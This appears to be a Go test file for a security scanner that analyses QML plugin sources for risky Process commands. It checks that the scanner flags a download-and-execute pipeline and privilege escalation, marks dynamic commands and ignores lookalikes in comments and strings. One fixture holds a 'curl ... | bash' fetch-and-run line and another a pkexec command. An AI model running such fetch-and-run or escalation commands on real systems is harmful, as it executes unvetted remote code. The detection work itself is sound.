package analyze

import (
	"testing"

	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/report"
)

func TestQMLExtractsLiteralProcessCommand(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("import Quickshell.Io\nProcess {\n  command: [\"curl\", \"-fsS\", \"https://example.test/data\"]\n}\n"),
	}))
	if len(result.Operations) != 1 {
		t.Fatalf("operations = %#v, want one", result.Operations)
	}
	op := result.Operations[0]
	if op.Command != "curl" || op.Dynamic || op.Evidence.LineStart != 3 {
		t.Fatalf("unexpected QML operation: %#v", op)
	}
	if hasFindingCategory(result, "download-and-execute") {
		t.Fatalf("ordinary QML curl was treated as download-and-execute: %#v", result.Findings)
	}
}

func TestQMLParsesInlineShellBeforeDownloadExecuteFinding(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process {\n command: [\"bash\", \"-c\", \"curl -fsS https://example.test/i | bash\"]\n}\n"),
	}))
	finding := findingByCategory(t, result, "download-and-execute")
	if finding.Severity != report.SeverityHigh || finding.Provenance.RuleID != "qml-lexical-shell-ast/v1" {
		t.Fatalf("unexpected QML pipeline finding: %#v", finding)
	}
}

func TestQMLMarksExpressionCommandDynamic(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { command: root.command }\n"),
	}))
	if len(result.Operations) != 1 || !result.Operations[0].Dynamic || result.Operations[0].Command != "<dynamic>" {
		t.Fatalf("dynamic QML command was guessed: %#v", result.Operations)
	}
}

func TestQMLIgnoresCommentAndStringLookalikes(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("// Process { command: [\"sudo\"] }\nItem { property string example: \"Process { command: [sudo] }\" }\n"),
	}))
	if len(result.Operations) != 0 {
		t.Fatalf("QML lookalikes produced operations: %#v", result.Operations)
	}
}

func TestQMLPrivilegeCommandUsesSharedContextRule(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { command: [\"pkexec\", \"systemctl\", \"enable\", \"demo\"] }\n"),
	}))
	finding := findingByCategory(t, result, "privilege-escalation")
	if finding.Evidence[0].Path != "Worker.qml" {
		t.Fatalf("privilege evidence lost QML source: %#v", finding)
	}
}

func TestQMLImperativeCommandAssignmentCreatesCoverageLimitation(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { id: worker }\nfunction run() { worker.command = [root.binary, '--check'] }\n"),
	}))
	limitation := limitationByCode(t, result, "qml-imperative-command-analysis-unavailable")
	if limitation.Path != "Worker.qml" || limitation.Scope != report.ScopeRuntime {
		t.Fatalf("imperative QML gap not scoped: %#v", limitation)
	}
}

func TestQMLImperativeCommandLookalikesAreIgnored(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("// worker.command = ['sudo']\nproperty string example: \"worker.command = ['sudo']\"\n"),
	}))
	for _, limitation := range result.Limitations {
		if limitation.Code == "qml-imperative-command-analysis-unavailable" {
			t.Fatalf("imperative command lookalike created limitation: %#v", limitation)
		}
	}
}
